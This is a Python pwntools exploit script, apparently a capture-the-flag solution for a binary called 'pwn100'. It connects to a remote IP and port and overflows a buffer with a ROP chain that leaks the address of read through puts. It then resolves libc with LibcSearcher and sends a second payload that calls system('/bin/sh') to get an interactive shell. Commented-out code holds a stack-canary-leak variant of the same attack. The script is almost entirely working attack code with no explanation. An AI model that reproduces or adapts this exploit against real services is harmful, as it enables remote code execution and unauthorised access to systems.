
from pwn import *
from ctypes import *
from LibcSearcher import *
context.log_level = 'debug'
# context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
context(os='linux', arch='amd64', log_level='debug')
# sh = process('./ret2libc164')
elf = ELF('./pwn100')
readgot=elf.got['read']
putsplt=elf.plt['puts']
# main_addr = elf.symbols['main']
main_addr =0x0000000000400908
rdi = 0x0000000000400a93
io = remote("111.200.241.244",55890)
# io = process("./pwn100")
# gdb.attach(io)
# io.recv()
# io.sendlineafter('--------\n>> ', '1')
pop_rdi = 0x0000000000400763
ret_addr = 0x000000000040068E
payload = 'A' * 0x40 + p64(0) + p64(pop_rdi) + p64(readgot) + p64(putsplt) + p64(ret_addr)
payload = payload.ljust(200,'0')
io.send(payload)
io.recvuntil('bye~\n')
addr = u64(io.recvn(6).ljust(8, '\x00'))
print("addr:",hex(addr))
# libc_local = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
# libc_base = addr - libc_local.symbols['read']
# print("libc_base",hex(libc_base))
# system_addr = libc_base + libc_local.symbols['system']
# bin = 0x000000000018ce57
# binsh_addr = libc_base + bin
# binsh_addr = libc_base + next(libc_local.symbols['str_bin_sh'])
libc = LibcSearcher('read', addr)
libc_base = addr - libc.dump('read')
print("libc_base",libc_base)
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'A' * 0x40 + p64(0) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
payload = payload.ljust(200,'0')
io.send(payload)
#
# io.sendlineafter('--------\n>> ', '2')
# info = io.recvline()
# log.info("info => %s", info)
# canary = u64(io.recvn(7).rjust(8, '\x00'))
# # log.info("canary => %#x", canary)
# # canary = u64(io.recvn(7).rjust(8,'\x00'))
# print('canary:',hex(canary))
# pause()
# io.sendlineafter('--------\n>> ', '1')
# payload = 'a' * 0x88 + p64(canary) + p64(0) + p64(rdi) + p64(readgot) + p64(putsplt) + p64(main_addr)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '3')
# read_addr = u64(io.recv(6).ljust(8,'\x00'))
# print('read_addr :',hex(read_addr))
# libc = LibcSearcher('read', read_addr)
# libc_base = read_addr - libc.dump('read')
# system_addr = libc_base + libc.dump('system')
# binsh_addr = libc_base + libc.dump('str_bin_sh')
# log.info("system_addr => %#x", system_addr)
# log.info("binsh_addr => %#x", binsh_addr)
# io.sendlineafter('--------\n>> ', '1')
# payload = 'a' * 0x88 + p64(canary) + p64(0) + p64(rdi) + p64(binsh_addr) + p64(system_addr) + p64(main_addr)
# io.sendline(payload)
# io.sendlineafter('--------\n>> ', '3')


io.interactive()
